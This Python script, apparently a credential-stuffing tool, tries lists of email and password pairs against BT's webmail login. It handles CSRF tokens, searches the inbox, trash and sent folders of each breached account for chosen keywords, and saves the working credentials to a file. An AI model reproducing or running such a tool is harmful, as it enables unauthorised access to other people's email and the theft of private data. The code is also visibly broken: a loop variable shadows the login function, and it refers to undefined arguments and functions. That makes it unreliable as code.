import os
import sys
import requests
from bs4 import BeautifulSoup
import csv
import time
import logging
import argparse

def parse_arguments():
    parser = argparse.ArgumentParser(description="Login script")
    parser.add_argument("--logins-file", default="logins.csv", help="File containing email logins (default: logins.csv)")
    parser.add_argument("--keywords-file", default="keywords.txt", help="File containing keywords (default: keywords.txt)")
    parser.add_argument("--succ-logins-file", default="succ-logins.csv", help="File to save successful logins (default: succ-logins.csv)")
    parser.add_argument("--log-file", default="login_script.log", help="Log file to store script logs (default: login_script.log)")
    parser.add_argument("--log-level", default="INFO", choices=["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"], help="Logging level (default: INFO)")
    return parser.parse_args()

def setup_logging(log_file, log_level):
    logging.basicConfig(filename=log_file, level=log_level, format="%(asctime)s - %(levelname)s - %(message)s")

def read_file(file_path):
    if os.path.exists(file_path):
        with open(file_path, "r") as f:
            return f.read().splitlines()
    return []

def login(username, password, login_url, logout_url):
    session = requests.Session()
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrfToken"}).get("value")

    login_data = {
        "username": username,
        "password": password,
        "csrfToken": csrf_token
    }

    response = session.post(login_url, data=login_data)

    if response.status_code == 200 and "signin1.bt.com/btmail/secure/emaillogin" in response.url:
        return session
    return None

def logout(session, logout_url):
    session.get(logout_url)

def check_keywords(session, keywords):
    folders = ["inbox", "trash", "sent"]  # Add additional folders here
    for folder in folders:
        response = session.get(f"https://signin1.bt.com/btmail/secure/{folder}")
        soup = BeautifulSoup(response.text, "html.parser")
        text = soup.get_text()
        if any(keyword in text for keyword in keywords):
            return True
    return False

def add_succ_login_to_csv(username, password, keywords, succ_logins_file):
    with open(succ_logins_file, "a") as f:
        writer = csv.writer(f)
        writer.writerow([username, password] + keywords)

def check_logins(logins, keywords, login_url, logout_url, succ_logins_file):
    total_logins = len(logins)
    successful_logins = 0
    for i, login in enumerate(logins, start=1):
        session = login(login["email"], login["password"], login_url, logout_url)
        if session:
            try:
                if check_keywords(session, keywords):
                    add_succ_login_to_csv(login["email"], login["password"], keywords, succ_logins_file)
                    logging.info(f"Successful login: {login['email']}")
                    successful_logins += 1
            except Exception as e:
                logging.error(f"Error with login {login['email']}: {e}")
            finally:
                logout(session, logout_url)
                time.sleep(5)
        else:
            logging.error(f"Login failed: {login['email']}")

        # Display progress
        print(f"Checked {i}/{total_logins} logins. Found {successful_logins} successful logins.", end="\r")

    # Display summary
    print("\n")
    print(f"Total logins checked: {total_logins}")
    print(f"Successful logins found: {successful_logins}")

def view_file(file_path):
    if os.path.exists(file_path):
        with open(file_path, "r") as f:
            print(f"Contents of {file_path}:")
            print(f.read())
    else:
        print(f"{file_path} does not exist.")

def modify_keywords(file_path):
    os.system(f"nano {file_path}")

def display_help():
    print("""
    BTEMAIL Login Script - Help

    This script allows you to automate the process of logging into email accounts,
    checking for specific keywords in the inbox, trash, and sent folders, and saving successful logins to a file.

    Here's how to use the script:

    1. Populate logins.csv: Add email addresses and passwords in logins.csv file.
    2. Add keywords: Add keywords you want to check for in the keywords.txt file.
    3. Run the script: Execute the script to start checking logins.
    4. Use the menu options to perform various actions such as viewing log files, modifying keywords, etc.
    5. Review logs: Check the login_script.log file for any errors or debug messages.

    For more information or assistance, feel free to consult the documentation or contact the author.

    """)

def main_menu(logins, keywords, succ_logins_file, login_url, logout_url):
    while True:
        print("""
        Welcome to BTEMAIL Login Script

        MENU:
        1. Check Logins (Attempts to log in with provided credentials and saves successful logins)
        2. View Logins.csv (Displays the contents of the logins.csv file)
        3. View Succ-logins.csv (Displays successful logins along with associated keywords)
        4. View Keywords.txt (Displays the contents of the keywords.txt file)
        5. Modify Keywords.txt (Allows modification of the keywords.txt file)
        6. View Log (Displays the content of the log file)
        7. Clear Log (Clears the content of the log file)
        8. Change Settings (Modify script settings)
        9. Help (Display instructions on how to use the script)
        10. About (Show information about the script)
        11. Exit (Exit the program)
        """)

        choice = input("Enter your choice: ")

        if choice == "1":
            print("\nChecking logins...")
            check_logins(logins, keywords, login_url, logout_url, succ_logins_file)
            print("\n")
        elif choice == "2":
            print("\nContents of logins.csv:")
            view_file("logins.csv")
            print("\n")
        elif choice == "3":
            print("\nContents of succ-logins.csv:")
            view_file(succ_logins_file)
            print("\n")
        elif choice == "4":
            print("\nContents of keywords.txt:")
            view_file("keywords.txt")
            print("\n")
        elif choice == "5":
            print("\nModifying keywords.txt...")
            modify_keywords("keywords.txt")
            print("\n")
        elif choice == "6":
            print("\nContents of the log file:")
            view_file("login_script.log")
            print("\n")
        elif choice == "7":
            print("\nClearing the log file...")
            clear_log("login_script.log")
            print("Log file cleared.\n")
        elif choice == "8":
            print("\nChanging script settings...")
            change_settings()
            print("\n")
        elif choice == "9":
            display_help()
        elif choice == "10":
            display_about()
        elif choice == "11":
            print("Exiting the program.")
            break
        else:
            print("Invalid choice. Please enter a valid option.\n")

def main():
    args = parse_arguments()
    setup_logging(args.log_file, args.log_level)

    logins = read_file(args.logins_file)
    keywords = read_file(args.keywords_file)

    main_menu(logins, keywords, args.succ_logins_file, args.login_url, args.logout_url)

if __name__ == "__main__":
    main()
